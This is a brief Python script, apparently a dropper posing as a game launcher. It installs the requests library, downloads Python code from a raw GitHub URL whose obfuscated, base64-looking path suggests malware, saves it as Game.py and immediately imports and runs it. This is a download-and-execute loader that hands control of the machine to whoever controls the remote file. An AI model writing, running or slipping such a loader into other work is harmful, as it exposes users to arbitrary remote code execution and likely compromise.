import subprocess
import sys
subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
from requests import get

code = get("https://raw.github.com/R0lUSFVC/TUFMV0FS/master/Game.py").text

with open("Game.py", "w") as f:
    f.write(code)

platform = sys.platform
import Game
Game.main(platform)